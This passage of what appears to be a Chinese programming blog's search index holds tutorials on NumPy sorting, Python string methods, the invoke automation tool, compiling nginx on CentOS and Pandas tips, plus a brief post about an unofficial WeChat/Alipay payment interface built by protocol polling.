更加全面、强大。\n\n你目前的项目是哪种需求呢？我可以帮你更具体地调整方案！ 😊🚀\n","categories":["Python","工具"],"tags":["pydantic","Python","beartype","类型检查","数据验证"]},{"title":"一日一技：Numpy进阶之排序小技巧","url":"/posts/14916.html","content":"Numpy提供了大量用数组操作的函数，其中不乏常见的排序函数。\n这里讲下numpy.sort、numpy.argsort、numpy.lexsort三种排序函数的用法。\n1、如何对数组元素进行快速排序？使用numpy.sort函数可以对数组进行排序，并返回排序好的数组。\n使用方法：\nnumpy.sort(a, axis=-1, kind=None, order=None)\n\n参数：\n\na : 要排序的数组；\naxis ：按什么轴进行排序，默认按最后一个轴进行排序；\nkind ：排序方法，默认是快速排序；\norder :  当数组定义了字段属性时，可以按照某个属性进行排序；\n\nimport numpy as np# 创建一个一维数组x1 = np.array([1,8,2,4])x1&#x27;&#x27;&#x27;一维数组：array([1, 8, 2, 4])&#x27;&#x27;&#x27;# 排序np.sort(x1)&#x27;&#x27;&#x27;输出：array([1, 2, 4, 8])&#x27;&#x27;&#x27;import numpy as np# 创建一个二维数组x2 = np.array([[1,8,2,4],[4,5,1,3]])x2&#x27;&#x27;&#x27;二维数组：array([[1, 8, 2, 4],       [4, 5, 1, 3]])&#x27;&#x27;&#x27;# 默认按最后一个轴排序，这里按行排序np.sort(x2)&#x27;&#x27;&#x27;输出：array([[1, 2, 4, 8],       [1, 3, 4, 5]])&#x27;&#x27;&#x27;# 轴设为0，即按列排序np.sort(x2,axis=0)&#x27;&#x27;&#x27;输出：array([[1, 5, 1, 3],       [4, 8, 2, 4]])&#x27;&#x27;&#x27;\n\n下面试下按照字段属性进行排序，需要用到order参数。\nimport numpy as np# 这是一个名字、身高、年龄的数组# 先给各字段配置属性类型dtype = [(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, float), (&#x27;Age&#x27;, int)]# 各字段值values = [(&#x27;Li&#x27;, 1.8, 41), (&#x27;Wang&#x27;, 1.9, 38),(&#x27;Duan&#x27;, 1.7, 38)]# 创建数组a = np.array(values, dtype=dtype)a&#x27;&#x27;&#x27;数组：array([(b&#x27;Li&#x27;, 1.8, 41), (b&#x27;Wang&#x27;, 1.9, 38), (b&#x27;Duan&#x27;, 1.7, 38)],      dtype=[(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, &#x27;&lt;f8&#x27;), (&#x27;Age&#x27;, &#x27;&lt;i4&#x27;)])&#x27;&#x27;&#x27;# 按照属性Height进行排序,此时参数为字符串          np.sort(a, order=&#x27;Height&#x27;)     &#x27;&#x27;&#x27;输出：array([(b&#x27;Duan&#x27;, 1.7, 38), (b&#x27;Li&#x27;, 1.8, 41), (b&#x27;Wang&#x27;, 1.9, 38)],      dtype=[(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, &#x27;&lt;f8&#x27;), (&#x27;Age&#x27;, &#x27;&lt;i4&#x27;)])&#x27;&#x27;&#x27;# 先按照属性Age排序,如果Age相等，再按照Height排序，此时参数为列表     np.sort(a, order=[&#x27;Age&#x27;, &#x27;Height&#x27;]) &#x27;&#x27;&#x27;输出：array([(b&#x27;Duan&#x27;, 1.7, 38), (b&#x27;Wang&#x27;, 1.9, 38), (b&#x27;Li&#x27;, 1.8, 41)],      dtype=[(&#x27;Name&#x27;, &#x27;S10&#x27;), (&#x27;Height&#x27;, &#x27;&lt;f8&#x27;), (&#x27;Age&#x27;, &#x27;&lt;i4&#x27;)])&#x27;&#x27;&#x27;\n\n2、如何获取数组元素排序后的索引？numpy.argsort函数用于将数组排序后，返回数组元素从小到大依次排序的所有元素索引。\n使用方法（和sort类似）：\nnumpy.argsort(a, axis=-1, kind=None, order=None)\n\n参数：\n\na : 要排序的数组；\naxis ：按什么轴进行排序，默认按最后一个轴进行排序；\nkind ：排序方法，默认是快速排序；\norder :  当数组定义了字段属性时，可以按照某个属性进行排序；\n\nimport numpy as np# 创建一维数组x = np.array([3, 1, 2])&#x27;&#x27;&#x27;数组：array([3, 1, 2])&#x27;&#x27;&#x27;# 获取排序后的索引np.argsort(x)&#x27;&#x27;&#x27;输出：array([1, 2, 0], dtype=int64)&#x27;&#x27;&#x27;import numpy as np# 创建二维数组x2 = np.array([[0, 3], [2, 2]])&#x27;&#x27;&#x27;数组：array([[0, 3],       [2, 2]])&#x27;&#x27;&#x27;# 默认按照最后一个轴进行排序，即行排序# 获取排序后的索引np.argsort(x2)&#x27;&#x27;&#x27;输出：array([[0, 1],       [0, 1]], dtype=int64)&#x27;&#x27;&#x27;\n\n按字段属性进行排序，并获取索引。\n# 先给各字段配置属性类型dtype = [(&#x27;name&#x27;, str), (&#x27;age&#x27;, int)]# 值values = [(&#x27;Anna&#x27;, 28), (&#x27;Bob&#x27;, 27),(&#x27;Brown&#x27;,21)]# 创建数组x = np.array(values, dtype=dtype)x&#x27;&#x27;&#x27;数组：array([(&#x27;&#x27;, 28), (&#x27;&#x27;, 27), (&#x27;&#x27;, 21)],      dtype=[(&#x27;name&#x27;, &#x27;&lt;U&#x27;), (&#x27;age&#x27;, &#x27;&lt;i4&#x27;)])&#x27;&#x27;&#x27;# 先按照属性name排序,如果name相等，再按照age排序np.argsort(x,order=[&#x27;name&#x27;,&#x27;age&#x27;])&#x27;&#x27;&#x27;输出：array([2, 1, 0], dtype=int64)&#x27;&#x27;&#x27;\n\n3、如何按多条件进行排序？\n这里举一个应用场景：\n小升初考试，重点班录取学生按照总成绩录取。\n在总成绩相同时，数学成绩高的优先录取，在总成绩和数学成绩都相同时，按照英语成绩录取…… \n这里，总成绩排在电子表格的最后一列，数学成绩在倒数第二列，英语成绩在倒数第三列。\n\nnumpy.lexsort函数用于按照多个条件（键）进行排序，返回排序后索引。\n使用方法：\nnumpy.lexsort(keys, axis=-1)\n\n参数：\n\nkeys ：序列或元组，要排序的不同的列；\naxis ：沿指定轴进行排序；\n\n说明： \n使用键序列执行间接稳定排序。\n给定多个排序键（可以将其解释为电子表格中的列），lexsort返回一个整数索引数组，该数组描述按多个列排序的顺序。\n序列中的最后一个键用于主排序顺序，倒数第二个键用于辅助排序顺序，依此类推。\nkeys参数必须是可以转换为相同形状的数组的对象序列。\n如果为keys参数提供了2D数组，则将其行解释为排序键，并根据最后一行，倒数第二行等进行排序。\nimport numpy as np# 英语成绩eng = [90,85,95,80]# 数学成绩math = [80,95,90,85]# 总成绩total = [170,170,185,165]# 排序，获取索引np.lexsort((eng,math,total))&#x27;&#x27;&#x27;先按总成绩total进行排序，再按数学成绩math进行排序，最后按英语成绩进行排序。可以看到total里有两个170，这时候就按下一级math排序，最后获取排序后的索引输出：array([3, 0, 1, 2], dtype=int64)&#x27;&#x27;&#x27;# 也可以直接传入数组score = np.array([[90,85,95,80],[80,95,90,85],[170,170,185,165]])np.lexsort(score)&#x27;&#x27;&#x27;输出：array([3, 0, 1, 2], dtype=int64)&#x27;&#x27;&#x27;\n\n\n\n参考资料[1]Numpy文档: https://numpy.org/devdocs/index.html\n[2]Numpy教程: https://www.runoob.com/numpy/numpy-tutorial.html\n","categories":["Python","数据科学"],"tags":["Python","Numpy","数据分析","排序"]},{"title":"免签约免手续费支付接口","url":"/posts/56199.html","content":"\n\n\n介绍&emsp;&emsp;这是一套微信 + 支付宝的免签约免手续费的接口集成核心代码，实现方式主要是web协议的分析，然后写爬虫进行轮询，要想准确的分辨出来支付的是谁，应当采用备注的方式，微信需要客户手动备注，支付宝有一个超链接可以不进行手动备注，直接生成二维码就行。这是提供给开发者使用的，无基础者不提供技术支持。早期我的网站想要对接一下支付接口，微信、支付宝官方手续费太高，已达到0.6个百分点，且要签约。第三方的例如码支付，黛支付，支付通等存在信息不安全，以及不稳定，难接入，收取手续费等问题。通过我前几年做过的Android App的机器人，可判断出第三方均使用抓取协议实现的，所以我用Python实现了一个。\n源码\n如果需要商业合作，请加群找我，我可以把这套代码集成成一个系统，提供开发接口的支付接口系统。\n\nPython源码：地址 \nPHP源码：github\n","categories":["Python","Web"],"tags":["Python","支付接口","免签约","爬虫","支付宝","微信支付"]},{"title":"史上最全python字符串操作指南","url":"/posts/50672.html","content":"字符串的定义日常编码中，大家会发现，太多时候我们需要对数据进行处理，而这数据不管是数组、列表、字典，最终都逃不开字符串的处理。所以今天要来跟大家发散的聊聊字符串！估计很多人看到是将字符串肯定觉得索然无味(老子都会)，可大佬们不妨再往下看看？\n\npython定义字符、字符串没有java那样的严格，不管是单引号、双引号、甚至是三个单引号和双引号都可以用来定义字符(串)，只要成对出现即可。比如：\n# 单个字符a=&#x27;a&#x27;# 使用单引号定义字符串name=&#x27;Uranus&#x27;# 使用双引号定义字符串code = &quot;Hello World ...&quot;# 既然说到了string，怎么能不点开源码看看呢？class str(object):    &quot;&quot;&quot;    str(object=&#x27;&#x27;) -&gt; str    str(bytes_or_buffer[, encoding[, errors]]) -&gt; str    Create a new string object from the given object. If encoding or    errors is specified, then the object must expose a data buffer    that will be decoded using the given encoding and error handler.    Otherwise, returns the result of object.__str__() (if defined)    or repr(object).    encoding defaults to sys.getdefaultencoding().    errors defaults to &#x27;strict&#x27;.    &quot;&quot;&quot;\n\n虽然这些不是主要说的，但还是简单提下，三个单引号或者双引号，主要是用来作为文档注释的，请不要拿来定义字符串(虽然这样并不会出现语法错误)。今天主要说下关于打段的字符串应该如何定义，PEP8有规定，一行代码的长度请勿超过120个字符。那么如果遇到这种情况，该怎么办？\n# 不推荐的使用方式：line = &quot;&quot;&quot;Create a new string object from the given object.If encoding or errors is specified,then the object must expose a data buffer that will bedecoded using the given encoding and error handler.&quot;&quot;&quot;# 或者这样line = &quot;Create a new string object from the given object. &quot; \\       &quot;If encoding or errors is specified,&quot; \\       &quot;then the object must expose a data buffer that will be&quot; \\       &quot; decoded using the given encoding and error handler.&quot;# 更好的实现方式：line = (&quot;Create a new string object from the given object.&quot;        &quot;If encoding or errors is specified,&quot;        &quot;then the object must expose a data buffer that will be &quot;        &quot;decoded using the given encoding and error handler.&quot;        )\n\n\n\n字符串中.is()的用法.is*(), 既然是is，那么它返回的结果只有两种，True or False先来对比一下数字：\n\nisdigit()True: Unicode数字，byte数字（单字节），全角数字（双字节），罗马数字False: 汉字数字Error: 无\nisdecimal()True: Unicode数字，全角数字（双字节）False: 罗马数字，汉字数字Error: byte数字（单字节）\nisnumeric()True: Unicode数字，全角数字（双字节），罗马数字，汉字数字False: 无Error: byte数字（单字节)\n\n总结几个偏门知识点：\na=&#x27;①②③④⑤&#x27;isdigit()、isnumeric() 为True isdecimal()为Falseb=&#x27;一壹&#x27;isnumeric()会认为是True的哦！\n\n再来看一个等式：\n\nisalnum() = isdigit() + isalpha() + isspace()isdigit()表示字符串内全部为数字isalpha()表示字符串内全部为字符isspace()表示字符串有一个或多个空格组成isalnum()表示字符串内全部为数字和字符\n\na=&#x27;12345&#x27;b=&#x27;①②③④⑤&#x27;c=&#x27;abc123&#x27;print(a.isdigit()) # Trueprint(b.isalpha()) # Trueprint(c.isalnum()) # True\n\n针对字符串大小写的方法：\n\n.isupper() 字符串全部由大写组成.islower() 字符串全部由小写组成.istitle() 字符串形式为驼峰命名，eg:”Hello World”\n\n以上这些用法去掉is，则变为了对应的字符串转发方法。学一套会两套，买一送一….\n最后说一个不带.的is* — isinstance(obj,type)\n\n判断一个object是什么类型…type可选类型为：int，float，bool，complex，str，bytes，unicode，list，dict，set，tuple并且type可以为一个原组：isinstance(obj, (str, int))\n\n判断字符串中的内容.*with() starts ends 不仅支持开头结尾的匹配，还支持start和end两个参数来动态定义字符串的index位置\nlong_string = &quot;To live is to learn，to learn is to better live&quot;long_string.startswith(&#x27;To&#x27;)long_string.startswith(&#x27;li&#x27;, 3, 5)long_string.endswith(&#x27;live&#x27;)long_string.endswith(&#x27;live&#x27;, 0, 7)\n\n同样支持start、end来判断字符串的还有 .find()、.rfind()和 .index()、.rindex()这两类字符串寻址方法均支持从左到右、从右至左两种寻址方式，不同的是：find在未找到时，返回-1，而index在未找到时，会抛出ValueError的异常…\nlong_string.index(&#x27;live&#x27;) # 3long_string.rindex(&#x27;live&#x27;) # 42\n\n\n\n字符串的内容变更狭义来说使用，字符串的替换使用.replace()即可，那为什么还要单独说呢？因为它有一个可选参数count\nlong_string = &quot;To live is to learn，to learn is to better live&quot;long_string.count(&#x27;live&#x27;) # 2long_string.replace(&#x27;live&#x27;,&#x27;Live&#x27;,1)output:&#x27;To Live is to learn，to learn is to better live&#x27;# 可以看到，第二个live并未进行替换\n\n刚才说了狭义，那么广义呢？\n\n(l/r)strip()\n将字符串左、右、两端的特定字符过滤掉，默认为空格…strip()要注意的地方是，strip(‘TolLive’) 中的字符并非完整匹配，而是针对每一个字符进行匹配，说起来混，直接上例子：\n long_string = &quot;To live is to learn，to learn is to better live&quot;long_string.strip(&#x27;TolLive&#x27;)&#x27;s to learn，to learn is to better&#x27;\n字符串切片\n字符串的切片分为long_string[start:end;step] start、end区间为左闭右开…这个网上说的太多了，再拉出来详细讲就要挨打了…\n(l/r)just(width,[fillchar])、center(width, [fillchar])、zfill(width)这些均为填充固定长度的字符，默认使用空格(zfill为左补0，z是zero的意思…),看意思就明白了，不用多讲了….\n\n\n字符串格式化输出本来fill和center等可以放在这里，但是他们使用频率和重量级不够格，就丢在上面了。Python格式化输出分为两类，那是在pyton2的时代，即 % 和 format。这两种网上的资料太多了，说的太多显得没逼格…但，还是要简单说说其中特殊的地方\n\n% 格式化输出：\n\n如何在%的格式输出中，输出用来看做标记为的%符号呢？使用两个百分号（%%）\n%(-)(width) width为设置长度，默认左填充空格，添加-号为右填充\n.width代表字符串截断，保留多少长度的字符串\ntype %s字符串 %d十进制整数  %f小数 …\n多个参数是，后面的参数需要使用括号包裹起来\n\n&#x27;姓名：%-5s 年龄：%4d 爱好： %.8s&#x27; % (&#x27;王大锤&#x27;,30,&#x27;python、Java&#x27;)output：&#x27;姓名：王大锤   年龄：  30 爱好：python、J&#x27;\nformat格式输出：\nformat在python3开始官方就表示为替换%的输出方式，之所以还保留着%，主要是为了兼容性考虑…\n\n对比%，format使用花括号{}表示变量\n&lt; &gt; ^ 代表了format的对齐方式\n\n&#x27;&#123;:-^40s&#125;&#x27;.format(&#x27;华丽的分割线&#x27;)output:&#x27;-----------------华丽的分割线-----------------&#x27;\n\n\nf-string\nPython3.6的版本更新时，新增了f-string，英文好的可以去看官方解释PEP 498 – Literal String Interpolation 。f-string是字符串引号前以f/F开头，并使用{}标注替换位置的使用形式。之所以官方推出f-string，主要是因为它的更高的性能、更强的功能。例子走起：\nname = &#x27;Uranus&#x27;f&#x27;Hello,&#123;name&#125;&#x27;f&#x27;Hello,&#123;name.lower()&#125;&#x27;f&#x27;Hello,&#123;name:^10s&#125;&#x27;f&#x27;Hello,&#123;(lambda x: x*2) (name)&#125;&#x27;output:&#x27;Hello,Uranus&#x27;&#x27;Hello,uranus&#x27;&#x27;Hello,  Uranus  &#x27;&#x27;Hello,UranusUranus&#x27;\n\n","categories":["Python","基础"],"tags":["Python","字符串","字符串操作","f-string"]},{"title":"强大的 Python 任务自动化工具！invoke 十分钟入门指南","url":"/posts/22812.html","content":"我们继续聊聊 Python 任务自动化的话题。\nnox 的作者在去年的 Pycon US 上，做了一场题为《Break the Cycle: Three excellent Python tools to automate repetitive tasks》的分享（B站观看地址：https://b23.tv/av86640235），她介绍了三个任务自动化工具：tox、nox 和 invoke，本文的话题正好就是最后的 invoke。\n\n1、invoke 可以做什么？invoke 是从著名的远程部署工具 Fabric 中分离出来的，它与 paramiko 一起是 Fabric 的两大最核心的基础组件。\n除了作为命令行工具，它专注于”任务执行”（task execution），可以标注和组织任务，并通过 CLI（command-line interface，即命令行界面） 和 shell 命令来执行任务。\n同样是任务自动化工具，invoke 与我们之前介绍过的 tox/nox 在侧重点上有所不同：\n\ntox/nox 主要是在打包、测试、持续集成等方面的自动化（当然它们能做的还不止于此）\ninvoke 则更具普遍性，可以用在任何需要”执行任务”的场景，可以是无相关性的任务组，也可以是有顺序依赖的分步骤的工作流\n\ninvoke 在 Github 上有 2.7K star，十分受欢迎，接下来我们看看它如何使用？\n2、怎么使用 invoke？首先，安装很简单：pip install invoke。\n其次，简单使用时有以下要素：\n\n任务文件。创建一个 tasks.py 文件。\n@task 装饰器。在一个函数上添加 @task 装饰器，即可将该函数标记为一个任务，接受 invoke 的调度管理。\n上下文参数。给被装饰的函数添加一个上下文参数（context argument），注意它必须作为第一个参数，而命名按约定可以是c 或ctx 或context 。\n命令行执行。在命令行中执行invoke --list 来查看所有任务，运行invoke xxx 来执行名为 xxx 的任务。命令行中的”invoke”可以简写成”inv”。\n\n以下是一个简单的示例：\n# 文件名：tasks.pyfrom invoke import task@taskdef hello(c):    print(&quot;Hello world!&quot;)@taskdef greet(c, name):    c.run(f&quot;echo &#123;name&#125;加油!&quot;)\n\n在上述代码中，我们定义了两个任务：\n\n“hello”任务调用了 Python 内置的 print 函数，会打印一个字符串”Hello world!”\n“greet”任务调用了上下文参数的 run() 方法，可以执行 shell 命令，同时本例中还可以接收一个参数。在 shell 命令中，echo 可理解成打印，所以这也是一个打印任务，会打印出”xxx加油！”（xxx 是我们传的参数）\n\n以上代码写在 tasks.py 文件中，首先导入装饰器 from invoke import task，@task 装饰器可以不带参数，也可以带参数（参见下一节），被它装饰了的函数就是一个任务。\n上下文参数（即上例的”c”）必须要显式地指明，如果缺少这个参数，执行时会抛出异常：”TypeError: Tasks must have an initial Context argument!”\n然后在 tasks.py 文件的同级目录中，打开命令行窗口，执行命令。如果执行的位置找不到这个任务文件，则会报错：”Can’t find any collection named ‘tasks’!\n正常情况下，通过执行inv --list 或者inv -l ，可以看到所有任务的列表（按字母表顺序排序）：\n&gt;&gt;&gt; inv -lAvailable tasks:  greet  hello\n\n我们依次执行这两个任务，其中传参时可以默认按位置参数传参，也可以指定关键字传参。结果是：\n&gt;&gt;&gt; inv helloHello world!&gt;&gt;&gt; inv greet 武汉武汉加油!&gt;&gt;&gt; inv greet --name=&quot;武汉&quot;武汉加油！\n\n缺少传参时，报错：’greet’ did not receive required positional arguments: ‘name’；多余传参时，报错：No idea what ‘???’ is!\n3、 如何用好 invoke？介绍完 invoke 的简单用法，我们知道了它所需的几项要素，也大致知道了它的使用步骤，接下来是它的其它用法。\n3.1 添加帮助信息在上例中，”inv -l”只能看到任务名称，缺少必要的辅助信息，为了加强可读性，我们可以这样写：\n@task(help=&#123;&#x27;name&#x27;: &#x27;A param for test&#x27;&#125;)def greet(c, name):    &quot;&quot;&quot;    A test for shell command.    Second line.    &quot;&quot;&quot;    c.run(f&quot;echo &#123;name&#125;加油!&quot;)\n\n其中，文档字符串的第一行内容会作为摘录，在”inv -l”的查询结果中展示，而且完整的内容与 @task 的 help 内容，会对应在”inv –help”中展示：\n&gt;&gt;&gt; inv -lAvailable tasks:  greet   A test for shell command.&gt;&gt;&gt; inv --help greetUsage: inv[oke] [--core-opts] greet [--options] [other tasks here ...]Docstring:  A test for shell command.  Second line.Options:  -n STRING, --name=STRING   A param for test\n\n3.2 任务的分解与组合通常一个大任务可以被分解成一组小任务，反过来，一系列的小任务也可能被串连成一个大任务。在对任务作分解、抽象与组合时，这里有两种思路：\n\n对内分解，对外统一：只定义一个 @task 的任务，作为总体的任务入口，实际的处理逻辑可以抽象成多个方法，但是外部不感知到它们\n多点呈现，单点汇总：定义多个 @task 的任务，外部可以感知并分别调用它们，同时将有关联的任务组合起来，调用某个任务时，也执行其它相关联的任务\n\n第一种思路很容易理解，实现与使用都很简单，但是其缺点是缺少灵活性，难于单独执行其中的某个/些子任务。适用于相对独立的单个任务，通常也不需要 invoke 就能做到（使用 invoke 的好处是，拥有命令行的支持）。\n第二种思路更加灵活，既方便单一任务的执行，也方便多任务的组合执行。实际上，这种场景才是 invoke 发挥最大价值的场景。\n那么，invoke 如何实现分步任务的组合呢？可以在 @task 装饰器的”pre”与”post”参数中指定，分别表示前置任务与后置任务：\n@taskdef clean(c):    c.run(&quot;echo clean&quot;)@taskdef message(c):    c.run(&quot;echo message&quot;)@task(pre=[clean], post=[message])def build(c):    c.run(&quot;echo build&quot;)\n\nclean 与 message 任务作为子任务，可以单独调用，也可以作为 build 任务的前置与后置任务而组合使用：\n&gt;&gt;&gt; inv cleanclean&gt;&gt;&gt; inv messagemessage&gt;&gt;&gt; inv buildcleanbuildmessage\n\n这两个参数是列表类型，即可设置多个任务。另外，在默认情况下，@task 装饰器的位置参数会被视为前置任务，接着上述代码，我们写一个：\n@task(clean, message)def test(c):    c.run(&quot;echo test&quot;)\n\n然后执行，会发现两个参数都被视为了前置任务：\n&gt;&gt;&gt; inv testcleanmessagetest\n\n3.3 模块的拆分与整合如果要管理很多相对独立的大型任务，或者需要多个团队分别维护各自的任务，那么，就有必要对 tasks.py 作拆分与整合。\n例如，现在有多份 tasks.py，彼此是相对完整而独立的任务模块，不方便把所有内容都放在一个文件中，那么，如何有效地把它们整合起来管理呢？\ninvoke 提供了这方面的支持。首先，只能保留一份名为”tasks.py”的文件，其次，在该文件中导入其它改名后的任务文件，最后，使用 invoke 的 Collection 类把它们关联起来。\n我们把本文中第一个示例文件改名为 task1.py，并新建一个 tasks.py 文件，内容如下：\n# 文件名：tasks.pyfrom invoke import Collection, taskimport task1@taskdef deploy(c):    c.run(&quot;echo deploy&quot;)namespace = Collection(task1, deploy)\n\n每个 py 文件拥有独立的命名空间，而在此处，我们用 Collection 可以创建出一个新的命名空间，从而实现对所有任务的统一管理。效果如下：\n&gt;&gt;&gt; inv -lAvailable tasks:  deploy  task1.greet  task1.hello&gt;&gt;&gt; inv deploydeploy&gt;&gt;&gt; inv task1.helloHello world!&gt;&gt;&gt; inv task1.greet 武汉武汉加油!\n\n关于不同任务模块的导入、嵌套、混合、起别名等内容，还有不少细节，请查阅官方文档了解。\n3.4 交互式操作某些任务可能需要交互式的输入，例如要求输入”y”，按回车键后才会继续执行。如果在任务执行期间需要人工参与，那自动化任务的能力将大打折扣。\ninvoke 提供了在程序运行期的监控能力，可以监听stdout 和stderr ，并支持在stdin 中输入必要的信息。\n例如，假设某个任务（excitable-program）在执行时会提示”Are you ready? [y/n]”，只有输入了”y”并按下回车键，才会执行后续的操作。\n那么，在代码中指定 responses 参数的内容，只要监听到匹配信息，程序会自动执行相应的操作：\nresponses = &#123;r&quot;Are you ready? \\[y/n\\] &quot;: &quot;y\\n&quot;&#125;ctx.run(&quot;excitable-program&quot;, responses=responses)\n\nresponses 是字典类型，键值对分别为监听内容及其回应内容。需注意，键值会被视为正则表达式，所以像本例中的方括号就要先转义。\n3.5 作为命令行工具库Python 中有不少好用的命令行工具库，比如标准库中的argparse、Flask 作者开源的click 与谷歌开源的fire 等等，而 invoke 也可以作为命令行工具库使用。\n（PS：有位 Prodesire 同学写了”Python 命令行之旅”的系列文章，详细介绍了其它几个命令行工具库的用法，我在公众号”Python猫”里转载过大部分，感兴趣的同学可查看历史文章。）\n事实上，Fabric 项目最初把 invoke 分离成独立的库，就是想让它承担解析命令行与执行子命令的任务。所以，除了作为自动化任务管理工具，invoke 也可以被用于开发命令行工具。\n官方文档中给出了一个示例，我们可以了解到它的基本用法。\n假设我们要开发一个 tester 工具，让用户pip install tester 安装，而此工具提供两个执行命令：tester unit 和tester intergration 。\n这两个子命令需要在 tasks.py 文件中定义：\n# tasks.pyfrom invoke import task@taskdef unit(c):    print(&quot;Running unit tests!&quot;)@taskdef integration(c):    print(&quot;Running integration tests!&quot;)\n\n然后在程序入口文件中引入它：\n# main.pyfrom invoke import Collection, Programfrom tester import tasksprogram = Program(namespace=Collection.from_module(tasks), version=&#x27;0.1.0&#x27;)\n\n最后在打包文件中声明入口函数：\n# setup.pysetup(    name=&#x27;tester&#x27;,    version=&#x27;0.1.0&#x27;,    packages=[&#x27;tester&#x27;],    install_requires=[&#x27;invoke&#x27;],    entry_points=&#123;        &#x27;console_scripts&#x27;: [&#x27;tester = tester.main:program.run&#x27;]    &#125;)\n\n如此打包发行的库，就是一个功能齐全的命令行工具了：\n$ tester --versionTester 0.1.0$ tester --helpUsage: tester [--core-opts] &lt;subcommand&gt; [--subcommand-opts] ...Core options:  ... core options here, minus task-related ones ...Subcommands:  unit  integration$ tester --listNo idea what &#x27;--list&#x27; is!$ tester unitRunning unit tests!\n\n上手容易，开箱即用，invoke 不失为一款可以考虑的命令行工具库。更多详细用法，请查阅文档 。\n4、小结invoke 作为从 Fabric 项目中分离出来的独立项目，它自身具备一些完整而强大的功能，除了可用于开发命令行工具，它还是著名的任务自动化工具。\n本文介绍了它的基础用法与 5 个方面的中级内容，相信读者们会对它产生一定的了解。invoke 的官方文档十分详尽，限于篇幅，本文不再详细展开，若感兴趣，请自行查阅文档哦。\n\n作者简介：豌豆花下猫，生于广东毕业于武大，现苏漂程序员，有一些极客思维，也有一些人文情怀，有一些温度，还有一些态度。\n","categories":["Python","工具"],"tags":["Python","自动化","invoke","命令行工具","Fabric"]},{"title":"手动编译安装nginx","url":"/posts/29613.html","content":"前言&emsp;这里采用的是CentOS 7系统演示。安装工具有些差别，但是原理流程是一样的。\n更新系统软件yum update -y\n\n\n\n安装编译工具yum install gcc -y\n\n\n\n安装pcre、pcre-devel&emsp;pcre是一个perl库，包括perl兼容的正则表达式库，nginx的http模块使用pcre来解析正则表达式，所以需要安装pcre库。\nyum install -y pcre pcre-devel\n\n\n\n安装zlib&emsp;zlib库提供了很多种压缩和解压缩方式nginx使用zlib对http包的内容进行gzip，所以需要安装。\nyum install -y zlib zlib-devel\n\n\n\n安装openssl&emsp;OpenSSL是http通信加密的库。\nyum install -y openssl openssl-devel\n\n\n\n下载官方源码wget http://nginx.org/download/nginx-1.9.9.tar.gz\n\n\n\n解压tar -zxvf  nginx-1.9.9.tar.gz\n\n\n\n配置编译安装&emsp;在解压目录下执行。\n./configure make make install\n\n","categories":["Linux","Web服务器"],"tags":["Linux","CentOS","Nginx","编译安装","Web服务器"]},{"title":"数据处理的3个小技巧，都很实用","url":"/posts/24269.html","content":"数据处理无所不在，掌握常用技巧，事半功倍。\n此系列使用 Pandas 开展数据处理分析，总结其中常用、好用的数据分析技巧。\n我使用的 Pandas 版本如下，顺便也导入 Pandas 库。\n&gt;&gt;&gt; import pandas as pd&gt;&gt;&gt; pd.__version__&#x27;0.25.1&#x27;\n\n今天使用的数据集名称：IMDB-Movie-Data，取自 Kaggle，百度网盘下载链接如下：\n\n链接: https://pan.baidu.com/s/15u7Hf2y5dSFwek2vA1-zjg 提取码: bvfx\n\n在开始前先确保解释器和数据集在同一目录下：\n&gt;&gt;&gt; import os&gt;&gt;&gt; os.chdir(&#x27;D://source/dataset&#x27;) # 这是我的数据集所在目录&gt;&gt;&gt; os.listdir() # 确认此目录已经存在 IMDB-Movie-Data 数据集[&#x27;drinksbycountry.csv&#x27;, &#x27;IMDB-Movie-Data.csv&#x27;, &#x27;movietweetings&#x27;, &#x27;titanic_eda_data.csv&#x27;, &#x27;titanic_train_data.csv&#x27;]\n\n准备工作就位后，正式开始数据处理技巧之旅。\n1 Pandas 移除某列导入数据\n&gt;&gt;&gt; df = pd.read_csv(&quot;IMDB-Movie-Data.csv&quot;)&gt;&gt;&gt; df.head(1) # 导入并显示第一行   Rank                    Title                    Genre  ...   Votes Revenue (Millions) Metascore0     1  Guardians of the Galaxy  Action,Adventure,Sci-Fi  ...  757074             333.13      76.0[1 rows x 12 columns]\n\n使用 pop 方法移除指定列：\n&gt;&gt;&gt; meta = df.pop(&quot;Title&quot;).to_frame() # 移除 Title 列\n\n确认是否已被移除：\n&gt;&gt;&gt; df.head(1) # df 变为 11列   Rank                    Genre  ... Revenue (Millions) Metascore0     1  Action,Adventure,Sci-Fi  ...             333.13      76.0[1 rows x 11 columns]\n\n2 统计标题单词数pop 后得到 meta，显示 meta 前 3 行：\n&gt;&gt;&gt; meta.head(3)                     Title0  Guardians of the Galaxy1               Prometheus2                    Split\n\n标题是由单词组成，中间用空格分隔。\n# .str.count(&quot; &quot;) + 1 得到单词个数 &gt;&gt;&gt; meta[&quot;words_count&quot;] = meta[&quot;Title&quot;].str.count(&quot; &quot;) + 1 &gt;&gt;&gt; meta.head(3) # words_count 列代表单词个数                     Title  words_count0  Guardians of the Galaxy            41               Prometheus            12                    Split            1\n\n3 Genre 频次统计下面统计电影 Genre 的频次，\n&gt;&gt;&gt; vc = df[&quot;Genre&quot;].value_counts()\n\n下面显示电影 Genre 的 Top5 ，最高频为出现 50 次的 Action,Adventure,Sci-Fi 类，次之为 48 次的 Drama 类：\n&gt;&gt;&gt; vc.head()Action,Adventure,Sci-Fi    50Drama                      48Comedy,Drama,Romance       35Comedy                     32Drama,Romance              31Name: Genre, dtype: int64\n\n展示 Top5 的饼状图：\n&gt;&gt;&gt; import matplotlib.pyplot as plt&gt;&gt;&gt; vc[:5].plot(kind=&#x27;pie&#x27;)&lt;matplotlib.axes._subplots.AxesSubplot object at 0x000001D65B114948&gt;&gt;&gt;&gt; plt.show()\n\n\n\n","categories":["Python","数据科学"],"tags":["Python","数据分析","Pandas","数据处理"]},{"title":"来说说__init__.py文件","url":"/posts/22682.html","content":"当你去看一些 Python 相关的项目时，常常会看到 init.py，当你使用某些编辑器创建 Python Package 的时候，它也会自动给你生成一个 init.py 文件。\n\n这玩意有什么用呢？\n我们知道， Python 中的包是可以包含多个 py 模块的，我们可以在不同的地方通过包名区分使用这些模块。\n话不多说，咱们先来创建一下这样的目录：\n\n我们在这里面创建了三个 Python 子包，里面都有 init 和 module 的 py 文件。\n我们分别在不同包下的 init 中写一个 print 语句：\n\n接着我们进入 Python ，分别来导入这些模块：\n\n可以看到，当我们导入父模块中的子模块的时候，它会优先执行父模块中的 init ，接着会执行指定模块中的 init。\n当然，只是导入父模块的时候只会执行父模块中的 init：\n\n也就是说，当我们去 import 一个 